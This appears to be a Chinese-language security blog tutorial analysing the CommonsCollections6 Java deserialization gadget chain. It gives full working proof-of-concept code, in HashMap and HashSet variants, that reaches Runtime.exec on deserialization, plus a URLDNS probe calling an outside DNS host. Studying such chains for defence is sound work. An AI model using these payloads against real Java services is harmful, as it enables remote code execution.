---
created: 2024-10-02T14:11:00+00:00
categories:
  - 技术研究
tags:
  - Java安全
updated: 2023-03-12T00:00:00+00:00
date: 2023-01-06T00:00:00+00:00
slug: java-deserialization-cc6
title: Java反序列化漏洞之CommonsCollections6链
cover: https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/044762f4-d488-4627-86cc-5da2ee2296a1/2.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T083949Z&X-Amz-Expires=3600&X-Amz-Signature=8fb3e167d8a4ef436a7de8a56d403080f1a3868faf915fe57f7a3bf977c9be5c&X-Amz-SignedHeaders=host&x-id=GetObject
id: 113906e1-7468-80fc-b98a-e2ed823334d8
---

## 背景

在前面关于 CommonsCollections1 链的两篇文章中，都提到了该链的利用是需要 JDK 版本小于 8u71，这一限制会降低此链在实战中的利用率。

有一条常用链不受 JDK 版本的限制，即 CommonsCollections6 链（后续简称 CC6 链），CC6 与 CC1 相比，Kick-off 入口类发生了变化，还增加了一个`TiedMapEntry`中间 Gadget 链，后续的`LazyMap`中间 Gadget 链和 Sink 依旧没变，对于部分重复的内容，在本文将不再赘述，如果对此不够了解，建议从前两篇文章开始看起。

## 影响范围

虽然 CC6 链不像 CC1 那样会受到 JDK 版本的约束，但对于 Commons Collections 的版本也是要求在 3.0 以上、3.2.2 以下，即大于等于 3.1 且小于等于 3.2.1。

## 前情回顾

上一篇[《Java 反序列化漏洞之 LazyMap 型 CC1 链》](https://0xf4n9x.github.io/java-deserialization-cc1-lazymap)文章中，有对`LazyMap`中间 Gadget 链做详细分析，通过向`LazyMap#decorate`方法传入一个恶意的`ChainedTransformer`对象作为恶意的`factory`，然后调用`LayzMap#get`方法，便会触发恶意行为。而`LayzMap#get`方法的触发是则是通过动态代理调用`AnnotationInvocationHandler.invoke`方法。

在 CC6 链中，就没有用到动态代理的技术去调用`AnnotationInvocationHandler.invoke`方法以触发`LayzMap#get`方法，而是通过`TiedMapEntry#hashCode`方法做到的。

## TiedMapEntry#hashCode

`org.apache.commons.collections.keyvalue.TiedMapEntry`也是 Apache Commons Collections 库中的一个类，它用于表示键值对的条目，`TiedMapEntry`类实现了表示映射条目的`Map.Entry`、表示键值对的`KeyValue`和用于序列化的`Serializable`接口。

```java
public class TiedMapEntry implements Map.Entry, KeyValue, Serializable {
    private static final long serialVersionUID = -8453869361373831205L;

    private final Map map;
    private final Object key;

    public TiedMapEntry(Map map, Object key) {
        super();
        this.map = map;
        this.key = key;
    }

    public Object getKey() {
        return key;
    }

    /**
     * 直接从map中获取此条目的值。
     */
    public Object getValue() {
        return map.get(key);
    }

    // ... 省略部分无关代码 ...

    /**
     * 获取与equals方法兼容的hashCode
     */
    public int hashCode() {
        Object value = getValue();
        return (getKey() == null ? 0 : getKey().hashCode()) ^
               (value == null ? 0 : value.hashCode());
    }
}
```

`TiedMapEntry`类中的`hashCode`方法将条目的键和值的哈希码进行异或运算，以计算条目的哈希码。在`hashCode`方法中有对`getValue`方法进行调用，而`getValue`中又存在`map.get`调用，这样便能够触发`LayzMap#get`。

```java
package com.javasec.cc;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.util.HashMap;
import java.util.Map;

public class TiedMapEntryTest {
    public static void main(String[] args) {
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class }, new Object[] {"getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class }, new Object[] {null, new Object[0] }),
                new InvokerTransformer("exec", new Class[] {String.class }, new Object[] {"open -a Calculator"})
        };
        Transformer tcChain = new ChainedTransformer(transformers);

        Map lazyMap = LazyMap.decorate(new HashMap(), tcChain);

        TiedMapEntry tme = new TiedMapEntry(lazyMap, "k");

        tme.hashCode();
    }
}
```

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/fb1b01e5-bd20-42cd-93c1-0f66e3f6bcb8/0.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T083949Z&X-Amz-Expires=3600&X-Amz-Signature=2f78a8b1c802e28a9108aeb40217fb27d3102794d577076d8aa963a2c2dffc0c&X-Amz-SignedHeaders=host&x-id=GetObject)

## HashMap

`java.util.HashMap`类在之前的 URLDNS 链中就已用到过，这里将其及其相关方法再一次贴出来。

```java
public class HashMap<K,V> extends AbstractMap<K,V> implements Map<K,V>, Cloneable, Serializable {

    static final int hash(Object key) {
        int h;
        return (key == null) ? 0 : (h = key.hashCode()) ^ (h >>> 16);
    }

    public V put(K key, V value) {
        return putVal(hash(key), key, value, false, true);
    }

    static final int hash(Object key) {
        int h;
        return (key == null) ? 0 : (h = key.hashCode()) ^ (h >>> 16);
    }

    private void readObject(java.io.ObjectInputStream s) throws IOException, ClassNotFoundException {
        // Read in the threshold (ignored), loadfactor, and any hidden stuff
        s.defaultReadObject();

        // ...

        if (mappings < 0) throw new InvalidObjectException("Illegal mappings count: " + mappings);
        else if (mappings > 0) { // (if zero, use defaults)
						// ...

            // Read the keys and values, and put the mappings in the HashMap
            for (int i = 0; i < mappings; i++) {
                @SuppressWarnings("unchecked")
                    K key = (K) s.readObject();
                @SuppressWarnings("unchecked")
                    V value = (V) s.readObject();
                putVal(hash(key), key, value, false, false);
            }
        }
    }
}
```

只要你稍微回忆下 URLDNS 链，一种似曾相识的感觉或许就会涌现你心头。其实不光是`HashMap`类，上面`TiedMapEntry#hashCode`方法的出现，也应该能够联系到 URLDNS 链，URLDNS 链中的 Sink 就是调用的`hashCode`方法。

这里，也将 URLDNS 完整调用链和 POC 再次贴出来，若对 URLDNS 链不熟悉，请先回头看[《Java 反序列化漏洞#URLDNS 链分析》](https://0xf4n9x.github.io/java-deserialization-vulnerability-principle#URLDNS%E9%93%BE%E5%88%86%E6%9E%90)。

```java
/*
HashMap.readObject()
    HashMap.putVal()
        HashMap.hash()
            URL.hashCode()
*/

public class URLDNS {
    public static void main(String[] args) throws Exception {
        URL url = new URL("<http://urldns.1asj4bef1af.ipv6.bypass.eu.org>");

        Class c = Class.forName("java.net.URL");
        Field f = c.getDeclaredField("hashCode");
        f.setAccessible(true);
        // 修改hashCode的值为非-1，以防止在序列化时触发DNS查询，造成误报
        f.set(url, 1);

        HashMap<URL, Integer> hashMap = new HashMap<>();
        hashMap.put(url, 0);

        // 将hashCode改回-1，以在反序列化时触发DNS查询
        f.set(url, -1);

        // 序列化
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("urldns.ser"));
        oos.writeObject(hashMap);
        // 反序列化
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream("urldns.ser"));
        ois.readObject();
    }
}
```

在此前的 URLDNS 链中，我们首先对`url`对象的成员变量`hashCode`修改成了非-1，以防在序列化时触发 DNS 查询，造成误报，然后再调用`put`方法，最后才会将`hashCode`改回-1，以在反序列化时触发 DNS 查询。

同理，在 CC 链中也需要这样的操作，由于此处涉及的是`Transformer`对象，那我们就可以先传入一个空`ChainedTransformer`至`lazyMap`，然后创建`TiedMapEntry`对象并传入这个`lazyMap`和一个 key，再创建`HashMap`对象并调用`put`新增`TiedMapEntry`对象和一个 value，最后利用反射将真正恶意的 Transformer 数组传入`ChainedTransformer`中。

最后的最后，还需对传入`lazyMap`中的键进行移除，以通过`LazyMap#get`方法中的 if 判断。

```java
public class LazyMap extends AbstractMapDecorator implements Map, Serializable {

    public Object get(Object key) {
        // 如果key当前不在map中，则为key创建value
        if (map.containsKey(key) == false) {
            Object value = factory.transform(key);
            map.put(key, value);
            return value;
        }
        return map.get(key);
    }
}
```

这样，在反序列化时便能够顺利地触发到`LazyMap#get`方法，并触发其中的`transform`方法调用。

综上，最终构造如下 POC。

```java
package com.javasec.cc;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

/* Gadget Chain:
HashMap.readObject()
    HashMap.put()
    HashMap.hash()
        TiedMapEntry.hashCode()
        TiedMapEntry.getValue()
            LazyMap.get()
                ChainedTransformer.transform()
                    ConstantTransformer.transform()
                    InvokerTransformer.transform()
                        Method.invoke()
                            Class.getMethod()
                    InvokerTransformer.transform()
                        Method.invoke()
                            Runtime.getRuntime()
                    InvokerTransformer.transform()
                        Method.invoke()
                            Runtime.exec()
*/

public class CC6WithHashMap {
    public static void main(String[] args) throws Exception {
        Transformer[] evilTransformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class }, new Object[] {"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class}, new Object[] {null, new Object[0]}),
                new InvokerTransformer("exec", new Class[] {String.class}, new Object[] {"open -a Calculator"})
        };

        // 创建一个空ChainedTransformer
        Transformer emptyTransformers = new ChainedTransformer(new Transformer[]{});

        // 将如上创建的空ChainedTransformer传入新创建的lazyMap中
        Map lazyMap = LazyMap.decorate(new HashMap(), emptyTransformers);

        // 创建TiedMapEntry对象，将lazyMap传入其中
        TiedMapEntry entry = new TiedMapEntry(lazyMap, "k");

        // 创建HashMap对象
        Map hashMap = new HashMap();
        hashMap.put(entry, "v");

        Field f = ChainedTransformer.class.getDeclaredField("iTransformers");
        f.setAccessible(true);
        // 利用反射技术，传入真正恶意的evilTransformers
        f.set(emptyTransformers, evilTransformers);

        // 移除传入lazyMap中的Key，使LazyMap#get方法中的(map.containsKey(key) == false)判断为true
        lazyMap.remove("k");

        // ----------------本地序列化与反序列化测试----------------
        ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("CC6WithHashMap.ser"));
        outputStream.writeObject(hashMap);
        outputStream.close();

        ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream("CC6WithHashMap.ser"));
        inputStream.readObject();
    }
}
```

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/22041d36-421a-4a2e-99a8-520f5f13e825/1.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T083949Z&X-Amz-Expires=3600&X-Amz-Signature=9d75480d54e6f64b113a037e077a90bb5281ab75d2aefbe341510dc9ff8b14d9&X-Amz-SignedHeaders=host&x-id=GetObject)

## HashSet

在 CC6 链中，除了`java.util.HashMap`类可作为 Kick-off 外，`java.util.HashSet`类也同样可以，只是稍显繁琐，Ysoserial 工具中的 CC6 链用到的就是这种方式。

`HashSet`是 Java 标准库中的一个类，具有快速添加、删除和查找等操作功能，并且实现了`Set`和`Serializable`等接口。`HashSet`内部实际上是通过一个`HashMap`实例来存储元素的，`HashSet`中的元素被存储为`HashMap`中的键，而对应的值则是一个固定的`Object`对象。在`HashSet`中，元素相当于是`HashMap`的键，而值则是一个占位符对象（即`PRESENT`常量），所以实际上`HashSet`只是一个对`HashMap`的包装，它通过键的唯一性来保证集合中不包含重复元素。

在`HashSet`中重写的`readObject`方法中，有对`HashMap`中的`put`方法进行调用。

```java
public class HashSet<E> extends AbstractSet<E> implements Set<E>, Cloneable, java.io.Serializable {
    static final long serialVersionUID = -5024744406713321676L;

    private transient HashMap<E,Object> map;

    // Dummy value to associate with an Object in the backing Map
    private static final Object PRESENT = new Object();

    // ...

    private void readObject(java.io.ObjectInputStream s) throws java.io.IOException, ClassNotFoundException {
        // Read in any hidden serialization magic
        s.defaultReadObject();

        // ...

        // Create backing HashMap
        map = (((HashSet<?>)this) instanceof LinkedHashSet ?
               new LinkedHashMap<E,Object>(capacity, loadFactor) :
               new HashMap<E,Object>(capacity, loadFactor));

        // Read in all elements in the proper order.
        for (int i=0; i<size; i++) {
            @SuppressWarnings("unchecked")
                E e = (E) s.readObject();
            map.put(e, PRESENT);
        }
    }
}
```

所以以`HashSet`作为 Kick-off，构造完整链的方式相比直接用`HashMap`，没有发生多大的变化，无非再多套一层`HashSet`，那么据此直接构造如下 POC 了。

```java
package com.javasec.cc;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;

/* Gadget Chain:
HashSet.readObject()
    HashMap.put()
    HashMap.hash()
        TiedMapEntry.hashCode()
        TiedMapEntry.getValue()
            LazyMap.get()
                ChainedTransformer.transform()
                    ConstantTransformer.transform()
                    InvokerTransformer.transform()
                        Method.invoke()
                            Class.getMethod()
                    InvokerTransformer.transform()
                        Method.invoke()
                            Runtime.getRuntime()
                    InvokerTransformer.transform()
                        Method.invoke()
                            Runtime.exec()
*/

public class CC6WithHashSet {
    public static void main(String[] args) throws Exception {
        Transformer[] evilTransformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class }, new Object[] {"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class}, new Object[] {null, new Object[0]}),
                new InvokerTransformer("exec", new Class[] {String.class}, new Object[] {"open -a Calculator"})
        };

        // 创建一个空ChainedTransformer
        Transformer emptyTransformers = new ChainedTransformer(new Transformer[]{});

        // 将如上创建的空ChainedTransformer传入新创建的lazyMap中
        Map lazyMap = LazyMap.decorate(new HashMap(), emptyTransformers);

        // 创建TiedMapEntry对象，将lazyMap传入其中
        TiedMapEntry entry = new TiedMapEntry(lazyMap, "k");

        Map hashMap = new HashMap();
        hashMap.put(entry, "v");

        // 返回一个包含hashMap中所有键的Set视图
        HashSet hashSet = new HashSet(hashMap.keySet());

        Field f = ChainedTransformer.class.getDeclaredField("iTransformers");
        f.setAccessible(true);
        // 利用反射技术，传入真正恶意的evilTransformers
        f.set(emptyTransformers, evilTransformers);

        // 移除传入lazyMap中的Key，使LazyMap#get方法中的(map.containsKey(key) == false)判断为true
        lazyMap.remove("k");

        // ----------------本地序列化与反序列化测试----------------
        ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("CC6WithHashSet.ser"));
        outputStream.writeObject(hashSet);
        outputStream.close();

        ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream("CC6WithHashSet.ser"));
        inputStream.readObject();
    }
}
```

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/4ea8c519-24e9-49ad-b6e9-278f0cee4763/2.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T083949Z&X-Amz-Expires=3600&X-Amz-Signature=66496250995291f6823117b0c66ea9ae7a3c6b488b7ffb5ac572ea543eca7dc7&X-Amz-SignedHeaders=host&x-id=GetObject)

## 参考

- [https://0xf4n9x.github.io/java-deserialization-vulnerability-principle](https://0xf4n9x.github.io/java-deserialization-vulnerability-principle)
- [https://0xf4n9x.github.io/java-deserialization-cc1-transformedmap](https://0xf4n9x.github.io/java-deserialization-cc1-transformedmap)
- [https://0xf4n9x.github.io/java-deserialization-cc1-lazymap](https://0xf4n9x.github.io/java-deserialization-cc1-lazymap)
- [https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections6.java](https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections6.java)
